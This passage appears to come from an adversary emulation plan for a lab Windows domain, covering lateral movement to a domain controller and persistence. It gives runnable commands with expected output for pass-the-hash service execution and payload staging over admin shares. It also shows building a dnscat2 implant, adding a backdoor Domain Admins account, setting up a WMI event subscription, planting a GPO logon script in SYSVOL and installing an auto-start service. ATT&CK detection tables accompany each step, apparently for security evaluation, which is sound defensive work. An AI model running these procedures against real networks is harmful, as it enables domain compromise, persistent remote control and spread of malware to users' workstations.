| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `CertCA.bin` created under `C:\ProgramData\` on DC01 via SMB2 `Write` originating from IIS01 (`10.12.10.20`); Sysmon Event 11 (FileCreate) on DC01 with remote source in SMB session context | Not Calibrated - Not Benign | `go-thehash.exe put` re-stages attack tool (`CertCA.bin`) from compromised IIS01 (internal) to DC01 (internal) over `C$` — same file-write-to-DC01 pattern already scored in Step 2; in sequential execution this is a setup substep for Step 4 Path B | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -

### Voice Track

`go-thehash.exe exec` opens an SMB2 session to DC01's `IPC$` share, binds to the
MS-SCMR interface (`\svcctl` named pipe), and issues three RPC operations:
`RCreateServiceW` (random 12-character service name, `ImagePath = C:\ProgramData\CertEnrollAgent.exe`,
account = `LocalSystem`), `RStartServiceW`, and `RDeleteServiceW`.

SCM (`services.exe`) spawns `CertEnrollAgent.exe` under the `LocalSystem` account —
`NT AUTHORITY\SYSTEM`. Unlike WMI, SCM uses its own configured service account and
does **not** impersonate the remote caller. The process therefore starts at System
Mandatory Level with no domain group membership.

The Herpaderping chain is identical to Step 3: `CertCA.bin` is read and deleted,
the ghost is spawned with a spoofed `svchost.exe` or fallback `wininit.exe` PPID,
and the ghost inherits `CertEnrollAgent.exe`'s own SYSTEM token via
`NtSetInformationProcess(ProcessAccessToken)`. The resulting C2 session runs as
`NT AUTHORITY\SYSTEM` with full local administrator privileges and no domain group
membership — **not domain admin**. This privilege level persists for all subsequent
commands issued through this dnscat2 session.

`CertEnrollAgent.exe` does not call `SetServiceStatus`, so SCM returns
`ERROR_SERVICE_REQUEST_TIMEOUT (0x427)` after 30 seconds — expected and logged as
such by `go-thehash`. Event ID 7045 is permanently written to the DC01 System log
at `RCreateServiceW` time and survives the subsequent `RDeleteServiceW`.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, trigger SCM service execution on DC01

  ```text
  C:\ProgramData> go-thehash.exe exec 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\ProgramData\CertEnrollAgent.exe"
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [*] Service '<random12>' created, starting...
    [!] Service start timed out (expected — command was dispatched)
    [+] Service '<random12>' deleted
    ```

- ☣️ On the attacker machine, confirm the new C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 3> whoami
  command (dc01) 3> whoami /groups
  command (dc01) 3> shell
  C:\Windows\system32> hostname
  ```

  - ***Expected Output***

    ```text
    nt authority\system

    GROUP INFORMATION
    -----------------

    Group Name                             Type             SID          Attributes
    ====================================== ================ ============ ==================================================
    BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
    Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
    Mandatory Label\System Mandatory Level Label            S-1-16-16384

    DC01
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | Event ID 4624 on DC01: Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`, source IP `10.12.10.20`; SMB2 connection to `IPC$` | Not Calibrated - Not Benign | `go-thehash.exe exec` authenticates to DC01 via NT hash to reach `IPC$\svcctl` — same Event ID 4624 Logon Type 3 NTLM pattern already scored in Step 2; implementation detail of T1569.002 | react.testlab.local | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Privilege Escalation | T1078.002 | Valid Accounts: Domain Accounts | Windows | Event ID 4624 on DC01: Logon Type 3, `TESTLAB\Administrator`, source IP `10.12.10.20` (IIS01); IPC$ session under domain admin account to reach `\svcctl` — SCM remote service creation and Event ID 7045 attributed to `TESTLAB\Administrator` | Not Calibrated - Not Benign | `go-thehash.exe exec` authenticates to DC01 via the `TESTLAB\Administrator` NT hash; service creation (Event ID 7045) and execution are attributed to the domain admin account in the SCM audit log — same Event ID 4624 identity signal already scored in Step 2; implementation detail of T1569.002 | DC01 | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Execution | T1569.002 | System Services: Service Execution | Windows | `go-thehash.exe` generates Event ID 7045 on DC01 by creating a temporary service (`<random12>`) via MS-SCMR to execute `C:\ProgramData\CertEnrollAgent.exe` as `LocalSystem` | Calibrated - Not Benign | `go-thehash.exe exec` issues `RCreateServiceW` + `RStartServiceW` + `RDeleteServiceW` via the `\svcctl` named pipe; SCM spawns `CertEnrollAgent.exe` as `LocalSystem` — SCM does not impersonate the remote caller | DC01 | TESTLAB\Administrator | [main.go execViaService()](../resources/payloads/go-thehash/main.go) | -
| Execution | T1106 | Native API | Windows | `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` resolved via `GetProcAddress`; all five stack-spoofed | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (running as `NT AUTHORITY\SYSTEM` on DC01) calls NT native APIs for Herpaderping; identical chain to Phase 3 Step 3 (same binary, same host, same technique) but different token context: Step 3 runs as domain admin, Step 4 runs as SYSTEM | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1055 | Process Injection | Windows | Process via `NtCreateProcessEx` from `SEC_IMAGE` section; `HD*.tmp` overwritten with junk; `ImageFileName = RuntimeBroker.exe`; PPID = Session 0 `svchost.exe` or `wininit.exe` | Not Calibrated - Not Benign | Identical Herpaderping chain to Phase 3 Step 3 — same host DC01, same binary, same artifacts (HD*.tmp, RuntimeBroker.exe ghost, PPID svchost/wininit Session 0); different token context (Step 3 domain admin, Step 4 SYSTEM); already scored in Step 3 | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | Ghost PPID = Session 0 `svchost.exe` or `wininit.exe`; `NtSetInformationProcess(ProcessAccessToken)` on ghost | Not Calibrated - Not Benign | `GetNonJobParent()` enumerates processes, filters to Session 0 via `ProcessIdToSessionId`, opens the first accessible `svchost.exe` or fallback `wininit.exe` for PPID spoofing; ghost inherits SYSTEM token from calling process (`CertEnrollAgent.exe` = LocalSystem); `NtSetInformationProcess` re-assigns duplicate SYSTEM token — identical mechanism to Phase 3 Step 3 on same host DC01 but different token context (**SYSTEM not domain admin**); already scored in Step 3 | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `C:\ProgramData\CertCA.bin` absent immediately after `CertEnrollAgent.exe` starts | Not Calibrated - Not Benign | `DeleteFileW(PAYLOAD_PATH)` called inside `GetPayloadBuffer()` after `ReadFile` — same file, same host DC01, same deletion mechanism as Phase 3 Step 3; already scored | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | Ghost `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; in-memory image is dnscat2 | Not Calibrated - Not Benign | `RtlCreateProcessParametersEx` sets ghost image path to `RuntimeBroker.exe` — identical artifact to Phase 3 Step 3 on same host DC01; already scored | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Discovery | T1012 | Query Registry | Windows | `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` read by ghost `RuntimeBroker.exe` whose on-disk image does not match | Not Calibrated - Not Benign | dnscat2 `getSystemDNS()` two-pass scan selects `127.0.0.1`; forwarded through DC01's conditional forwarder — same registry key, same ghost process, same host DC01 as Phase 3 Step 3; already scored | DC01 | NT AUTHORITY\SYSTEM | [getdns_windows.go collectDNSServers()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | DNS queries from DC01 to `127.0.0.1` forwarded to `192.168.56.2`; encoded subdomain labels; record types `TXT`, `CNAME`, `MX` | Not Calibrated - Not Benign | dnscat2 C2 session from DC01 as `NT AUTHORITY\SYSTEM` with local admin privileges but no domain group membership; DNS routed through DC01's own resolver via conditional forwarder — same host DC01, same DNS C2 pattern already scored in Phase 3 Step 3 | DC01 | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS payloads encrypted with session keys derived from ECDH P-256 key exchange; pre-shared secret `c7517dee4fcbe16a0c8c1f98cdc5ce4e` used for HMAC authenticator verification; opaque to DNS content inspection | Not Calibrated - Not Benign | dnscat2 performs ECDH P-256 key exchange then encrypts C2 traffic with Salsa20 stream cipher; pre-shared secret used for authenticator verification — identical encryption mechanism to Phase 1 Step 3 and Phase 3 Step 3 | DC01 | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollAgent.exe` spawned by SCM (`services.exe`) as LocalSystem service starts in Session 0 with no interactive window; dnscat2 ghost process compiled with `-H windowsgui` has no console window | Not Calibrated - Not Benign | Windows SCM spawns services in a non-interactive station — `CertEnrollAgent.exe` and the resulting dnscat2 ghost both have no visible window; dnscat2 compiled with `-H windowsgui` enforces no-window at PE entry point — identical environment attribute to Phase 3 Step 3 on same host DC01; already scored | DC01 | NT AUTHORITY\SYSTEM | [dnscat2 build flags](../resources/payloads/dnscat2/go-client) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | Ghost `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; `ProcessParameters` spoofed via `RtlCreateProcessParametersEx`; PEB `ProcessParameters` pointer patched via `WriteProcessMemory` | Not Calibrated - Not Benign | `CWLHerpaderping` on DC01 (running as `NT AUTHORITY\SYSTEM` via SCM) sets ghost image path to `RuntimeBroker.exe` and patches the PEB pointer; dnscat2 C2 session appears as `RuntimeBroker.exe` running as `NT AUTHORITY\SYSTEM` — identical mechanism to Phase 3 Step 3 on same host DC01 but different token context; already scored | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` (CWLHerpaderping) resolves `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` via `GetProcAddress` from `ntdll.dll` at runtime; none appear in the binary's static import table | Not Calibrated - Not Benign | CWLHerpaderping calls `GetProcAddress` to resolve all five injection-critical NT APIs at runtime rather than importing them statically — the binary's IAT contains no references to these functions, making them invisible to static import analysis; identical to Phase 1 Step 3 and Phase 3 Step 3 | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` and `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) have no PDB path, stripped symbol table, and zero-length debug section; built with Go `-s -w` flags removing all symbol and debug information | Not Calibrated - Not Benign | Go binaries compiled with `-s -w -H windowsgui`: `-s` omits symbol table, `-w` omits DWARF debug info — PE files contain no readable strings or metadata that would identify origin or functionality to static analysis tools; identical to Phase 1 Step 3 and Phase 3 Step 3 | DC01 | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Defense Evasion | T1134 | Access Token Manipulation | Windows | `CertEnrollAgent.exe` calls `NtSetInformationProcess` with class `ProcessAccessToken` on the ghost process handle, assigning a duplicate of its own `NT AUTHORITY\SYSTEM` primary token | Not Calibrated - Not Benign | After ghost process creation via `NtCreateProcessEx`, `CertEnrollAgent.exe` duplicates its own primary token and assigns it to the ghost via `NtSetInformationProcess(ProcessAccessToken)` — overriding the inherited spoofed parent token with SYSTEM token; identical mechanism to Phase 1 Step 3 and Phase 3 Step 3 but different token context (Step 3 domain admin, Step 4 SYSTEM) | DC01 | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -

---



## Step 5 — Stage Persistence Payloads on DC01

### Voice Track

`dnscat2.exe`, `dnscat-service.exe`, `ServiceInstaller.exe`, and
`NtServiceInstaller.exe` must be present on DC01 before the later
persistence mechanisms are configured. `dnscat2.exe` is already staged on IIS01 from
Step 1. `dnscat-service.exe` and both service installers should also be placed on IIS01
before using `go-thehash.exe put` to copy all persistence payloads to DC01 over the
`C$` admin share.

Build `dnscat-service.exe` on the attacker machine if not already compiled:

```bash
cd resources/payloads/dnscat2/go-client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultDomain=attacker.local \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
  -o dnscat-service.exe ./cmd/dnscat-service/
```

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, upload persistence payloads to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\dnscat2.exe C:\ProgramData\dnscat2.exe
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\dnscat-service.exe C:\ProgramData\dnscat-service.exe
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\ServiceInstaller.exe C:\ProgramData\ServiceInstaller.exe
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.exe
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\dnscat2.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\dnscat-service.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\ServiceInstaller.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\NtServiceInstaller.exe
    ```

- ☣️ On the DC01 dnscat2 shell, verify all persistence binaries are present

  ```text
  command (dc01) 2> shell
  C:\ProgramData> dir dnscat2.exe dnscat-service.exe ServiceInstaller.exe NtServiceInstaller.exe
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | Event ID 4624 on DC01: Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`, source IP `10.12.10.20` (IIS01); SMB2 C$ tree connect for persistence payload staging | Not Calibrated - Not Benign | `go-thehash.exe put` authenticates to DC01 via NT hash to open a C$ tree for staging persistence payloads — same SMB C$ auth pattern already scored in Step 2 | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | SMB2 `TreeConnect` to `\\DC01\C$` from IIS01 (`10.12.10.20`); files written to `C:\ProgramData\` on DC01 and correlated with the same SMB session | Not Calibrated - Not Benign | `go-thehash.exe put` opens an SMB2 tree to `\\DC01\C$` to place persistence payloads; admin share (`C$`) used for lateral tool staging — same C$ TreeConnect pattern already scored in Step 2 | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `dnscat2.exe`, `dnscat-service.exe`, `ServiceInstaller.exe`, and `NtServiceInstaller.exe` created under `C:\ProgramData\` on DC01 via SMB2 `Write` originating from IIS01 (`10.12.10.20`); file creation on DC01 correlated with the SMB session from IIS01 | Not Calibrated - Not Benign | Setup substep: `go-thehash.exe put` moves persistence payloads from compromised IIS01 (internal) to DC01 (internal) over `C$`; prerequisite for later persistence mechanisms | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -

---

## Step 6 — Domain Backdoor Account (T1136.002, T1098.007)

### Voice Track

A covert domain account provides credential-based fallback access that survives complete
C2 destruction: even if all payloads are removed and all sessions are burned, `svcbackup`
can re-authenticate via SMB, WinRM, or RDP from any system on the network.

`net user` and `net group` are standard Windows utilities available in any cmd shell. On
a DC, they write directly to the domain NTDS database through the local LDAP/SAM API
stack without requiring additional tooling. Both operations are logged immediately by the
DC's Security event log — Event ID 4720 (account created) and Event ID 4728 (member added
to security-enabled global group) — generated by the LSA/AD subsystem independently of
the execution chain.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the backdoor domain account

  ```text
  C:\ProgramData> net user svcbackup P@ssw0rd2026! /add /domain
  ```

  - ***Expected Output***

    ```text
    The command completed successfully.
    ```

- ☣️ Add the backdoor account to Domain Admins

  ```text
  C:\ProgramData> net group "Domain Admins" svcbackup /add /domain
  ```

  - ***Expected Output***

    ```text
    The command completed successfully.
    ```

- ☣️ Verify group membership

  ```text
  C:\ProgramData> net user svcbackup /domain
  ```

  - ***Expected Output (excerpt)***

    ```text
    User name                    svcbackup
    ...
    Global Group memberships     *Domain Users         *Domain Admins
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1136.002 | Create Account: Domain Account | Windows | Event ID 4720 on DC01 records creation of domain account `svcbackup` | Calibrated - Not Benign | `net.exe user svcbackup P@ssw0rd2026! /add /domain` executed from within the dnscat2 ghost process; the AD account object and Event ID 4720 are independently verifiable even though parent execution context is obfuscated | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1098.007 | Account Manipulation: Additional Local or Domain Groups | Windows | Event ID 4728 on DC01 records `svcbackup` added to `Domain Admins` | Calibrated - Not Benign | `net.exe group "Domain Admins" svcbackup /add /domain` executed from within the dnscat2 ghost process; the AD group membership change and Event ID 4728 are independently verifiable even though parent execution context is obfuscated | DC01 | TESTLAB\Administrator | - | -

---

## Step 7 — WMI Permanent Event Subscription (T1546.003)

### Voice Track

A WMI permanent event subscription persists across reboots without any registry run key,
scheduled task, or service entry. Three objects are created in the `root\subscription`
WMI namespace:

- `__EventFilter` (`CertPolicyFilter`): a WQL query polling `Win32_PerfRawData_PerfOS_System`
  every 60 seconds — guaranteed to fire on any running Windows system.
- `CommandLineEventConsumer` (`CertPolicyConsumer`): executes `C:\ProgramData\dnscat2.exe`
  when the filter fires.
- `__FilterToConsumerBinding`: binds the filter to the consumer.

Once bound, `wmiprvse.exe` polls the filter on its own schedule. When it fires,
`wmiprvse.exe` spawns `dnscat2.exe` directly — no ghost process, no loader. The
`CommandLineEventConsumer` host always runs under `NT AUTHORITY\SYSTEM`, so the resulting
C2 session appears as SYSTEM regardless of which Path (A or B) was used.

PowerShell is used here for its convenient `Set-WmiInstance` API. The scored artifact
is the subscription binding in `root\subscription` — the PowerShell invocation is an
unscored setup step. Subscription creation is logged as Event ID 5861 in the
`Microsoft-Windows-WMI-Activity/Operational` log.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the WMI permanent event subscription

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$ns='root\subscription'; $f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name='CertPolicyFilter';EventNamespace='root\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'\"}; $c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name='CertPolicyConsumer';CommandLineTemplate='C:\ProgramData\dnscat2.exe'}; Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f.Path.Path;Consumer=$c.Path.Path}"
  ```

  - ***Expected Output***

    ```text
    (no output — PowerShell returns the created objects silently; errors surface here if any step fails)
    ```

- ☣️ Verify the subscription binding is present

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select Filter, Consumer"
  ```

  - ***Expected Output***

    ```text
    Filter                                                          Consumer
    ------                                                          --------
    \\.\root\subscription:__EventFilter.Name="CertPolicyFilter"    \\.\root\subscription:CommandLineEventConsumer.Name="CertPolicyConsumer"
    ```

- ☣️ On the attacker machine, wait ≤ 60 seconds for the subscription to fire and confirm the new C2 session

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 3> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` runs with `-NoProfile -Command` argument containing `Set-WmiInstance` calls; PowerShell Script Block Logging Event ID 4104 records the full subscription creation script | Not Calibrated - Not Benign | Setup substep: PowerShell is the delivery vehicle for WMI object creation; the scored artifact is the subscription binding (T1546.003), not the invocation | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1546.003 | Event Triggered Execution: Windows Management Instrumentation Event Subscription | Windows | Event ID 5861 on DC01 (`Microsoft-Windows-WMI-Activity/Operational`): consumer `CertPolicyConsumer` bound to filter `CertPolicyFilter` in `root\subscription`; `__EventFilter`, `CommandLineEventConsumer`, and `__FilterToConsumerBinding` objects queryable via `Get-WmiObject -Namespace root\subscription` | Calibrated - Not Benign | Three WMI objects created in `root\subscription`: 60-second `Win32_PerfRawData_PerfOS_System` poll filter, `CommandLineEventConsumer` pointing to `C:\ProgramData\dnscat2.exe`, and binding; `wmiprvse.exe` spawns `dnscat2.exe` directly on each poll cycle | DC01 | TESTLAB\Administrator (creator) / NT AUTHORITY\SYSTEM (runtime) | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | WMI `__EventFilter` object named `CertPolicyFilter` and `CommandLineEventConsumer` named `CertPolicyConsumer` in `root\subscription` namespace; Event ID 5861 shows consumer name `CertPolicyConsumer` | Not Calibrated - Not Benign | WMI subscription objects deliberately named to resemble Windows certificate policy infrastructure; this naming is an evasion attribute of the scored WMI subscription artifact (T1546.003), not a separate scoring point | DC01 | TESTLAB\Administrator | - | -

---

## Step 8 — Network Logon Script (T1037.003)

### Voice Track

A domain GPO logon script provides implicit lateral reach to workstations without any
additional lateral movement step: when any domain user logs into any domain-joined
machine, `userinit.exe` reads the Default Domain Policy's `scripts.ini`, resolves the
UNC path from SYSVOL, and executes the script in the user's security context.

`dnscat2.exe` is copied into the SYSVOL `scripts` folder under the name `update.exe`.
SYSVOL is replicated to all domain controllers via DFS-R, so the payload is instantly
available from every DC. The Default Domain Policy (GUID
`{31B2F340-016D-11D2-945F-00C04FB984F9}`) `scripts.ini` for User logon is then written
with a single `0CmdLine` entry pointing to the UNC path.

The resulting C2 sessions appear under the logged-on user's account — typically a
standard domain user without elevated rights. Three independently observable artifacts
are generated:
1. File creation: `update.exe` in `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\`.
2. File creation: `scripts.ini` in the Default Domain Policy User Scripts path.
3. Process creation: `userinit.exe` spawns `update.exe` on each workstation logon —
   originating from a legitimate Windows process, not a ghost or injected context.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stage `dnscat2.exe` into the SYSVOL scripts folder

  ```text
  C:\ProgramData> copy C:\ProgramData\dnscat2.exe "C:\Windows\SYSVOL\sysvol\testlab.local\scripts\update.exe"
  ```

  - ***Expected Output***

    ```text
    1 file(s) copied.
    ```

- ☣️ Write the Default Domain Policy logon `scripts.ini` to register `update.exe`

  ```text
  C:\ProgramData> set GPO_SCRIPTS=C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\User\Scripts
  C:\ProgramData> md "%GPO_SCRIPTS%\Logon" 2>nul
  C:\ProgramData> (echo [Logon]& echo 0CmdLine=\\testlab.local\SYSVOL\testlab.local\scripts\update.exe& echo 0Parameters=) > "%GPO_SCRIPTS%\scripts.ini"
  ```

  - ***Expected Output***

    ```text
    (no output — file written silently)
    ```

- ☣️ Verify the `scripts.ini` content

  ```text
  C:\ProgramData> type "%GPO_SCRIPTS%\scripts.ini"
  ```

  - ***Expected Output***

    ```text
    [Logon]
    0CmdLine=\\testlab.local\SYSVOL\testlab.local\scripts\update.exe
    0Parameters=
    ```

- ☣️ Trigger: on any domain-joined workstation, log on with a domain user account and confirm new C2 session

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (<workstation>) 4> whoami
  ```

  - ***Expected Output***

    ```text
    testlab\<username>
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | File `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\update.exe` created on DC01; replicated via DFS-R and accessible as `\\testlab.local\SYSVOL\testlab.local\scripts\update.exe` from any domain-joined host | Not Calibrated - Not Benign | Setup substep: `copy` drops `dnscat2.exe` into the SYSVOL scripts share as `update.exe`; this staging is an implementation detail of the GPO logon-script persistence captured by T1484.001 and T1037.003 | DC01 | TESTLAB\Administrator | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1484.001 | Domain or Tenant Policy Modification: Group Policy Modification | Windows | `scripts.ini` created or modified under `C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\User\Scripts\`; file contains `0CmdLine=\\testlab.local\SYSVOL\testlab.local\scripts\update.exe` | Calibrated - Not Benign | Attacker writes `scripts.ini` directly into the Default Domain Policy SYSVOL path from the DC01 SYSTEM shell — modifying the live GPO content without using any Group Policy management interface; DFS-R replication propagates the policy file and workstations execute `update.exe` via `userinit.exe` on next logon | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1037.003 | Boot or Logon Initialization Scripts: Network Logon Script | Windows | On domain-joined workstation: `userinit.exe` spawns `update.exe` (resolved from `\\testlab.local\SYSVOL\...`) during domain user logon; Sysmon Event 1: `ParentImage = C:\Windows\System32\userinit.exe`, `Image = update.exe` | Calibrated - Not Benign | GPO logon script execution: `userinit.exe` reads `scripts.ini` and launches `update.exe` (dnscat2) in the logged-on user's security context; execution originates from a legitimate Windows process — not from a ghost or injected context | Workstations | TESTLAB\<domain user> | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -

---

## Step 9 — API-Based Windows Service Persistence (T1543.003)

### Voice Track

`ServiceInstaller.exe` installs `dnscat-service.exe` as a named auto-start Windows
service by calling the Service Control Manager APIs directly (`OpenSCManagerW`,
`CreateServiceW`, and `ChangeServiceConfig2W`). This avoids spawning `sc.exe` while
still using the normal SCM service creation path.

The service is immediately visible to SCM and can be started in the same step. SCM
launches `dnscat-service.exe` as `LocalSystem`, so the resulting C2 session runs as
`NT AUTHORITY\SYSTEM` on DC01. Unlike Step 4's transient service execution, this
service is persistent: the service registry key remains under
`HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost`, `Start` is set to auto-start,
and the service survives reboot until explicitly deleted.

### Procedures

- ☣️ From the DC01 dnscat2 shell, install the API-created Windows service

  ```text
  C:\ProgramData> ServiceInstaller.exe install C:\ProgramData\dnscat-service.exe CertPolicyHost "Certificate Policy Host" "Maintains certificate policy synchronization"
  ```

  - ***Expected Output***

    ```text
    Service 'CertPolicyHost' installed successfully
    ```

- ☣️ Start the service and confirm a new SYSTEM C2 session

  ```text
  C:\ProgramData> ServiceInstaller.exe start CertPolicyHost
  ```

  - ***Expected Output***

    ```text
    Starting service 'CertPolicyHost'...
    Service 'CertPolicyHost' started successfully
    ```

- ☣️ On the attacker machine, confirm the service-backed C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
